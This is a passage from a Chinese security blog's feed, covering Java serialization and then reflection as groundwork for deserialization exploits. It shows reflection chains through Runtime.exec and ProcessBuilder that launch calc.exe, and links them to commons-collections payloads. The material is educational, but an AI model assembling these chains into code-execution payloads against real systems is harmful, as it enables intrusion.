若要保存“Object对象”，则使用writeObject()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>(02) 通过readObject()方法，读取之前保存的变量。readObject的原始定义是在ObjectInputStream.java中，我们按照如下示例覆盖即可：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123; </span><br><span class="line">    in.defaultReadObject();       <span class="comment">// 使定制的readObject()方法可以利用自动序列化中内置的逻辑。 </span></span><br><span class="line">    <span class="keyword">int</span> ival = in.readInt();      <span class="comment">// 若要读取“int类型的值”，则使用readInt()</span></span><br><span class="line">    Object obj = in.readObject(); <span class="comment">// 若要读取“Object对象”，则使用readObject()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="2"><li><strong>为什么要规定传参，规定private修饰，void返回类型呢？</strong></li></ol><p>emmm，一个很微妙的问题，可能有为啥，可能….就是没有为啥，一个规范吧。目前母鸡，也没想去多深究了。</p><p>最后，在网上看到:</p><blockquote><p>readObject方法根本就不能被重写，因为原本的readObject方法被申明为final，该类型的方法不能被重写</p></blockquote><p>我们从源码上分析来说，这种说法应该是正确的，我们并没有重写readObject，而是执行了一个自定义的全新函数，但是也不知道用词汇去修正这个形容，我们全文也还是再说readObject复写，自己清楚就好。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.smi1e.top/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%9f%ba%e7%a1%80/" target="_blank" rel="noopener">https://www.smi1e.top/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%9f%ba%e7%a1%80/</a><br>解决为何复写函数需要private属性和ObjectInputStream作为参数：<br><a href="https://xz.aliyun.com/t/4761" target="_blank" rel="noopener">膜大佬</a><br><a href="https://www.cnblogs.com/sharkli/p/5607895.html" target="_blank" rel="noopener">膜程序员</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文主要分成四部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;java序列化与反序列化的正常使用&lt;/li&gt;
&lt;li&gt;java反序列化readObject是如
      
    
    </summary>
    
    
      <category term="web" scheme="http://lalajun.com/tags/web/"/>
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
      <category term="java反序列化" scheme="http://lalajun.com/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>java反射机制</title>
    <link href="http://lalajun.com/2019/08/19/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
    <id>http://lalajun.com/2019/08/19/java反射机制/</id>
    <published>2019-08-19T09:05:28.000Z</published>
    <updated>2019-12-30T02:35:42.255Z</updated>
    
    <content type="html"><![CDATA[<h2 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h2><p>真正反序列化漏洞的利用，还需要了解java反射原理。因为java反序列化的payload大多与反射机制密切相关。</p><p>在Java中的反射机制是指在运行状态中，对于任意一个类都能够知道这个类所有的属性和方法；并且对于任意一个对象，都能够调用它的任意一个方法；这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。<br>让java可以在运行时，根据传入的类名字符串，去执行这个类存在的方法等。</p><p>一个不使用反射机制的例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;  </span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span> <span class="keyword">implements</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"Apple"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Orange</span> <span class="keyword">implements</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"Orange"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 构造工厂类  </span></span><br><span class="line"><span class="comment">// 也就是说以后如果我们在添加其他的实例的时候只需要修改工厂类就行了  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> fruit <span class="title">getInstance</span><span class="params">(String fruitName)</span></span>&#123;  </span><br><span class="line">        fruit f=<span class="keyword">null</span>;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"Apple"</span>.equals(fruitName))&#123;  </span><br><span class="line">            f=<span class="keyword">new</span> Apple();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"Orange"</span>.equals(fruitName))&#123;  </span><br><span class="line">            f=<span class="keyword">new</span> Orange();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> f;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] a)</span></span>&#123;  </span><br><span class="line">        fruit f=Factory.getInstance(<span class="string">"Orange"</span>);  </span><br><span class="line">        f.eat();  </span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果我们想要添加新的水果，就需要</p><ul><li>添加新的水果类</li><li>修改Factory</li><li>在main函数中使用新的水果类</li></ul><p>修改为反射机制的代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span> <span class="keyword">implements</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"Apple"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Orange</span> <span class="keyword">implements</span> <span class="title">fruit</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"Orange"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Factory</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> fruit <span class="title">getInstance</span><span class="params">(String ClassName)</span></span>&#123;  </span><br><span class="line">        fruit f=<span class="keyword">null</span>;  </span><br><span class="line">        <span class="keyword">try</span>&#123;  </span><br><span class="line">            f=(fruit)Class.forName(ClassName).newInstance();  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> f;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] a)</span></span>&#123;  </span><br><span class="line">        fruit f=Factory.getInstance(<span class="string">"Reflect.Apple"</span>);  </span><br><span class="line">        <span class="keyword">if</span>(f!=<span class="keyword">null</span>)&#123;  </span><br><span class="line">            f.eat();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这时候如果我们需要添加水果，只需要</p><ul><li>添加水果类</li><li>在main函数中使用新的水果类即可</li></ul><p>那么好像可以看出一点问题，如果传入的类名可控，再加上一些办法，那就不是可以调用任意类，去运行系统命令了呢。</p><h3 id="反射机制的方法"><a href="#反射机制的方法" class="headerlink" title="反射机制的方法"></a>反射机制的方法</h3><p>列出在实际利用中重要的方法例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(className);    </span><br><span class="line">    clazz.getMethod(methodName).invoke(clazz.newInstance()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>឴获取类：<strong>forName</strong></li><li>获取类下的函数：<strong>getMethod</strong></li><li>执行类下的函数：<strong>invoke</strong></li><li>实例化类的对象：<strong>newInstance</strong></li></ul><p>以下一步步使用反射机制实现<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code>这个语句</p><ul><li>getRuntime():其实就是Runtime类获取对象的方式，等于new一个Runtime类。之所以封装成一个函数是为了不调用一次建立一个对象，只获取一个对象来执行操作。</li><li>exec():调用exec函数</li><li>calc.exe：调用计算器程序</li></ul><p>反射机制的执行顺序跟直接调用有些差别，一步步来</p><h4 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h4><p>获得一个class对象(<strong>java.lang.Class</strong>)有三种方法：</p><ol><li><code>obj.getClass()</code>:如果上下文中存在某个类的实例obj，那么我们可以直接通过<code>obj.getClass()</code>来获取它的类。<ol><li>假如obj是实例：获取该实例的class（如Runtime.getRuntime().getClass()结果就是class java.lang.Runtime类）（此处类的意思实际上时class这个类的对象）</li><li>假如obj是类：获取到java.lang.Class类（class这个类的对象）</li></ol></li><li><code>Test.class</code>:Test是一个已经加载的类，想获取它的java.lang.Class对象，直接拿取class参数即可。（这不是反射机制）</li><li><code>Class.forName</code>:如果知道类的名字，可以直接使用forname来获取。</li></ol><p>forName两种使用形式<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; forName(String name) </span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line">Class&lt;?&gt; forName(String name, **<span class="keyword">boolean</span>** initialize, ClassLoader loader)</span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line"><span class="comment">//initialize：是否进行“类初始化”</span></span><br><span class="line"><span class="comment">//loader：加载器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一种调用形式等同于第二种，其实就是第二种形式的封装，默认进行"类初始化”，默认加载器根据类名（完整路径）来加载</span></span><br><span class="line">Class.forName(className) </span><br><span class="line">Class.forName(className, <span class="keyword">true</span>, currentLoader)</span><br></pre></td></tr></table></figure></p><p><strong>类初始化</strong>：<br>类初始化不等于类的实例化，举个例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始块</span></span><br><span class="line">    &#123;        </span><br><span class="line">        System.out.printf(<span class="string">"Empty block initial %s\n"</span>, <span class="keyword">this</span>.getClass());    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态初始块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">"Static initial %s\n"</span>, TrainPrint.class);    </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">"Initial %s\n"</span>, <span class="keyword">this</span>.getClass());</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    Class.forName(<span class="string">"TrainPrint"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Static initial class TrainPrint</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">   TrainPrint test= <span class="keyword">new</span> TrainPrint();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Static initial class TrainPrint</span></span><br><span class="line"><span class="comment">// Empty block initial class TrainPrint</span></span><br><span class="line"><span class="comment">// Initial class TrainPrint</span></span><br></pre></td></tr></table></figure><p>类的实例化：<code>静态初始块</code>-&gt;<code>初始块</code>-&gt;<code>构造函数</code><br>类的初始化：<code>静态初始块</code></p><p>具有父类的类的实例化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code>-&gt;<code>父类初始块</code>-&gt;<code>父类构造函数</code>-&gt;<code>子类初始块</code>-&gt;<code>子类构造函数</code><br>具有父类的类的实例化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code></p><blockquote><p>以上对于类初始化的说明其实就是说，单独一个Class.forName(),在类静态初始块可控的情况下，可以执行恶意代码。</p></blockquote><p><strong>调用内部类</strong>:<br>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： C1.class 和 C1$C2.class，我们可以把他们看作两个无关的类。<br><code>Class.forName(&quot;C1$C2&quot;)</code>可以调用这个内部类。</p><p>我们可以通过<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>来获取类（java.lang.Runtime是Runtime类的完整路径）</p><h4 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h4><p>getMethod 的作用是通过反射获取一个类的某个特定的<strong>公有</strong>方法。<br>而Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表，如下：<br><code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class)</code></p><h4 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h4><p>invoke方法位于Method类下，其的作用是传入参数，执行方法，<br><code>public Object invoke(Object obj, Object... args)</code><br>它的第一个参数是执行method的对象：</p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象 </li><li>如果这个方法是一个静态方法，那么第一个参数是类（之后会提到，这里其实不用那么死板，这个）<br>它接下来的参数才是需要传入的参数。</li></ul><p>由于我们的exec函数是一个普通方法，需要传入类对象，即<code>invoke(类对象，exec方法传入的参数)</code><br>之前说到Runtime的类对象不能通过newInstance()来获取对象（class.newInstance等于new class）,是因为Runtime的类构造函数是一个private构造函数，只能通过getRuntime方法返回一个对象。<br>获取类对象：<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))</code> (由于getRuntime是一个静态方法，invoke传入Runtime类，进行调用)<br><code>invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))，&quot;calc.exe&quot;)</code></p><p>那么合成以上的操作：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>, String.class).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))，<span class="string">"calc.exe"</span>)</span><br></pre></td></tr></table></figure></p><p>亲测可弹框,再简化一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">clazz.getMethod(<span class="string">"exec"</span>, String.class).invoke(clazz.getMethod(<span class="string">"getRuntime"</span>).invoke(clazz), <span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure></p><p>以上我们就完成了通过类内置的静态方法获取类的实例，进一步调用一个public方法。<br>但是假如一个类没有无参构造方法（即不能class.newInstance()），也没有单例模式（只存在一个实例）的静态方法（即不能像getRuntime一样获取实例），那我们该如何实例化这个类呢？</p><h3 id="指定的构造方法生成类的实例"><a href="#指定的构造方法生成类的实例" class="headerlink" title="指定的构造方法生成类的实例"></a>指定的构造方法生成类的实例</h3><p>继续举一个演化成反射机制的执行命令payload的例子：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; paramList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">paramList.add(<span class="string">"calc.exe"</span>);</span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(paramList);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure></p><p>可见，其构造函数是写入了一个字符串，不是无参构造方法，接下来我们会一步步进行转化。</p><p><code>getConsturctor()</code>函数可以选定指定接口格式的构造函数(由于构造函数也可以根据参数来进行重载)，即：<code>getConsturctor(参数类型)</code></p><p>选定后我们可以通过newInstance(),并传入构造函数的参数执行构造函数，即<code>newInstance(传入的构造函数参数)</code>。</p><p>ProcessBuilder有两个构造函数：</p><ul><li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li><li><code>public ProcessBuilder(String... command)</code>(此处，String<code>...</code>这种语法表示String参数数量是可变的，与String[]一样)<br>分别执行构造方法获取实例的语句如下：</li><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(String.class).newInstance(&quot;calc.exe&quot;))</code></li><li><code>Class.forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;)))</code></li></ul><p>执行完构造方法获取实例之后，其实可以通过类型强制转化，进而执行start()函数，进行执行命令。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">( (ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">"calc.exe"</span>)) ).start();</span><br></pre></td></tr></table></figure></p><p>但实际情况下并不一定可以这样利用，所以继续使用反射机制调用start函数,start函数不是一个静态函数,需要传入类的实例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">clazz.getMethod(<span class="string">"start"</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">"calc.exe"</span>)));</span><br></pre></td></tr></table></figure></p><p>亲测成功</p><p>另一种形式的构造函数的反射转换：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">"calc.exe"</span>);<span class="comment">//这个可以传入多个字符串</span></span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure></p><p>因为ProcessBuilder构造函数传入的参数其实不是一个字符串String.class类型，而是一个变长的字符串数组String[].class，所以我们应该如下调用。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[]&#123;<span class="string">"calc.exe"</span>&#125;)).start();</span><br></pre></td></tr></table></figure></p><p>但是实际上我们这样调用是会报错的，因为newInstance函数接受参数是一个<code>Object..</code>也就是Object数组，它会完美契合我们提供的String[]，剥去一层数组。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g667bkzna5j31k413twjf.jpg" alt></p><p>来看看之前的List形式构造函数的形式：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g667by6gs9j31k10kzmyz.jpg" alt></p><p>可见少了一层，List传入会被当做Object的第一项，而String[]传入，会直接被当作Object。<br>所以我们需要再加一层[]：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">"calc.exe"</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g667c63emdj30wc099aaw.jpg" alt></p><p>亲测可弹计算器。</p><h3 id="执行私有方法"><a href="#执行私有方法" class="headerlink" title="执行私有方法"></a>执行私有方法</h3><p>以上都是方法或构造方法是public函数，但是如果是私有方法，我们该如何调用？<br>之前我们用的都是getMethod、getConstructor，接下来需要使用getDeclaredMethod、getDeclaredConstructor：</p><ul><li>getMethod等方法获取的是当前类中所有公共方法，包括从父类继承的方法 </li><li>getDeclared等方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</li></ul><p>之前说到Runtime的构造方式是一个私有方法，从而不能直接调用，那么接下来我们来调用Runtime的构造方法来获取一个实例来执行calc.exe：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">Constructor m = clazz.getDeclaredConstructor(); </span><br><span class="line">m.setAccessible(<span class="keyword">true</span>); </span><br><span class="line">clazz.getMethod(<span class="string">"exec"</span>, String.class).invoke(m.newInstance(), <span class="string">"calc.exe"</span>);</span><br></pre></td></tr></table></figure></p><p>在获取到私有方法后，通过<code>setAccessible(true)</code>可以打破私有方法访问限制，从而进行调用。<br>getDeclaredMethod、getDeclaredConstructor和getMethod、getConstructor使用方法是一致的，就不赘述了。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>那么我们已经通过反射机制，调用任意类的任意方法了。<br>具体的函数说明表格可以参考<a href="https://www.jianshu.com/p/9be58ee20dee" target="_blank" rel="noopener">简书</a></p><h2 id="从commons-collections回来的invoke性质补充说明"><a href="#从commons-collections回来的invoke性质补充说明" class="headerlink" title="从commons-collections回来的invoke性质补充说明"></a>从commons-collections回来的invoke性质补充说明</h2><p>一直以来我们都看到这种反射机制的调用来获取Runtime类的实例：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))</span><br></pre></td></tr></table></figure></p><p>看到这个例子，我们可能会固定思维的误解：<br>我们从哪个类中获取方法，在invoke中就应该传入哪个类或这个类的实例（上面说过，这个需要根据方法来定）</p><p>我们从源码来看一下Method类中的invoke函数的输入输出说明：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* <span class="meta">@param</span> obj  the object the underlying method is invoked from<span class="comment">//调用基础方法的对象</span></span><br><span class="line">* <span class="meta">@param</span> args the arguments used <span class="keyword">for</span> the method call<span class="comment">//调用这个方法的传参</span></span><br><span class="line">* <span class="meta">@return</span> the result of dispatching the method represented by<span class="comment">//调用这个方法的返回结果</span></span><br><span class="line">* <span class="keyword">this</span> object on &#123;<span class="meta">@code</span> obj&#125; with parameters</span><br></pre></td></tr></table></figure></p><p>来对照普通调用语句和反射语句之间的对应关系，这里前后两个class都是相同的Runtime class</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7btssl3pdj319206d0t7.jpg" alt="invoke实质.png"></p><p>那么讲道理一般的调用，默认我们的固定思维惯性，也不会有什么问题，因为选中一个类的方法自然是应该传入这个类的实例或这个类。<br>直到出现一些意外：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不要把下面的语句当作反射机制，就当作Runtime.getRuntime()是一个普通函数调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(...)</span><br><span class="line">Class.forName(<span class="string">"java.lang.Class"</span>).getMethod(...)</span><br><span class="line"><span class="comment">//好比有一个函数可以在两个class中调用</span></span><br><span class="line">a.getMethod()</span><br><span class="line">b.getMethod()</span><br></pre></td></tr></table></figure></p><p>如上我们一直忽略了我们反射机制中调用的函数实际上可以在不同的class中调用，这一点在commons-collections中十分关键：<br>由于当时的环境<br>不允许我们得到<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(...)</code><br>只有<code>Class.forName(&quot;java.lang.Class&quot;).getMethod(...)</code></p><p>那么我们可以得到以下途径进行变形：</p><ul><li>用反射机制去调用反射机制中使用的函数getMethod</li><li>使用invoke传入的obj去指定getMethod的当前的调用环境（在实际代码执行中是this变量的区别）</li></ul><p>看一看Class类中getMethod方法的接口<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Method 